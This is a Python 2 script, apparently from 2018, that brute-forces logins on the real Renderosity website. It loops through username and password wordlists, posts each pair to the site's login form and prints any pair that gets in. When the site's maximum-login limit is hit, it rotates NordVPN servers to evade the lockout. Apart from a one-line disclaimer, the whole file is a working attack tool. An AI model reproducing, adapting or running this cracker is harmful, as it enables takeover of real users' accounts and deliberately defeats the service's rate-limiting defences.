
# Renderosity Cracker Experiment - Pythogen 2018
# Refined output handling / Invalid / Valid login + Rate Limit Detection with VPN switching

# Code for cracker configuration reference
# NordVPN Required for VPN auto-switching

# Developed and Tested on Linux

# Code isn't polished. Just for reference purposes
# Disclaimer: Not intended for malicious uses. Do not use for black hat purposes!

import requests
from random import randint
from time import sleep
from tqdm import tqdm
import os

#Main Routine.
def main():

	#Global Variables
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global attempts
	global text_file
	global text_file2
	global keyword2
	global arrVPN
	global vindex
	global vtimer

	# VPN Array
	arrVPN = ['al1.nordvpn.com.udp.ovpn','al2.nordvpn.com.udp.ovpn','al3.nordvpn.com.udp.ovpn','al4.nordvpn.com.udp.ovpn','al5.nordvpn.com.udp.ovpn','ar1.nordvpn.com.udp.ovpn','ar2.nordvpn.com.udp.ovpn','ar3.nordvpn.com.udp.ovpn','ar4.nordvpn.com.udp.ovpn','ar5.nordvpn.com.udp.ovpn','at10.nordvpn.com.udp.ovpn','se36.nordvpn.com.udp.ovpn','se37.nordvpn.com.udp.ovpn','se38.nordvpn.com.udp.ovpn','se39.nordvpn.com.udp.ovpn','se40.nordvpn.com.udp.ovpn','se41.nordvpn.com.udp.ovpn','se42.nordvpn.com.udp.ovpn','se43.nordvpn.com.udp.ovpn','se44.nordvpn.com.udp.ovpn','se45.nordvpn.com.udp.ovpn','se46.nordvpn.com.udp.ovpn']

	# VPN Index
	vindex = 0

	# VPN Timer Index
	vtimer = 5

	# Load into dictionary
	text_file = open("users.txt", "r")
	text_file2 = open("pw.txt", "r")

	# Username List [Split New Lines]
	USERNAME = text_file.read().split('\n')
	# Password List [Split New Lines]
	PASSWORD = text_file2.read().split('\n')

	# Site's Name (Banner)
	Service = 'Renderosity - Cracker'
	# Login URL
	login_URL = 'https://www.renderosity.com/login/'
	# login_URL redirected to after login_URL containing keyword
	landing = 'https://www.renderosity.com/'
	# The keyword that indicates successful login_URL detection
	keyword = 'does not match'
	# Rated
	keyword2 = "Maximum login"

	# Display Banner
	print '%s\n' % (Service)


main()
def cpPrompt():
	global c

	# Command line Construct. Add commands here..
	while(True):

		# Listen for command input
		cmd = raw_input('Command>')

		# Command Input Construct
		if cmd == '?':
			# Show list of commands
			print ('\n- start (Activate Cracker)'
					'\n- quit (Exit Program)\n')
		# Close	
		elif cmd == 'quit':
			quit()
		# Begin
		elif cmd == "start":
			print " "
			break


cpPrompt()
def processReq():
	global USERNAME
	global PASSWORD
	global keyword2

	with requests.Session() as c:
		
		# Cycle
		for u in USERNAME:
			# Display current username above progressbar
			print "Username: %s" % (u)
			for p in tqdm(PASSWORD):
		
				#1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				# Header data
				header_data = \
				{
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'en-US,en;q=0.9',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Content-Length': '93',
					'Content-Type': 'application/x-www-form-urlencoded',
					'Host': 'www.renderosity.com',
					'Origin': 'https://www.renderosity.com',
					'Referer': 'https://www.renderosity.com/login/',
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36'
				}

				login_data = \
				{
					'gotoPage': 'https://www.renderosity.com',
					'username': u,
					'password': p,
					'StoreIt': 'Yes'
				}

				#2) Submit POST data. Initialize login
				pushit = c.post(login_URL, data=login_data, headers=header_data)

				# If "Incorrect Password" keyword detected...
				Check = pushit.content.find(keyword)
				# If Rate Limit detected...
				Check2 = pushit.content.find(keyword2)

				# If keywords not found then cracked
				if Check == -1 and Check2 == -1:
					print ' \nCracked: %s:%s\n' % (u,p)
					# Login success. Go to command console
					cpPrompt()
				# Else if maximum login attempts reached then indicate
				elif Check2 != -1:
					print "\n\nDoors are locked. Power down the canons...\n"
					VPNSwitch()
				# Else continue cracking
				else:
					pass

		print "\nNothing found..\n"
		cpPrompt()

# Function for Auto-Switching your VPN (Linux)
def VPNSwitch():
	global vindex
	global arrVPN
	global vtimer

	print "\nSwitching VPN...\n"
	# Check length of VPN array:
	# If less than array length then increment..
	if vindex < len(arrVPN) - 1:
		vindex = vindex + 1
		print vindex
	# Else, if end of array then reset vindex
	else:
		vindex = 0

	# Navigate to VPN Directory
	os.chdir("/etc/openvpn/ovpn_udp")
	# Be sure to include & save your authentication details in .ovpn file for automatic login (Guide: https://my.hostvpn.com/knowledgebase/22/Save-Password-in-OpenVPN-for-Automatic-Login.html)
	os.system("gnome-terminal -e 'bash -c \"sudo openvpn %s; sleep 10\" '" % (arrVPN[vindex]))

	print "\nVPN: %s\n" % (arrVPN[vindex])
	print "\nVPN Switched.\n"
	sleep(1)
	print "\nPlease wait...\n"
	VPNTimer()

# Function for 5 second delay between VPN Switch
def VPNTimer():
	global vtimer

	sleep(1)
	if vtimer == 0:
		vtimer = 5
		print "\nResume cracking.\n"
		return
	else:
		print "%s Seconds..." % (vtimer)
		vtimer = vtimer - 1
		VPNTimer()

#Process Auth Details
processReq()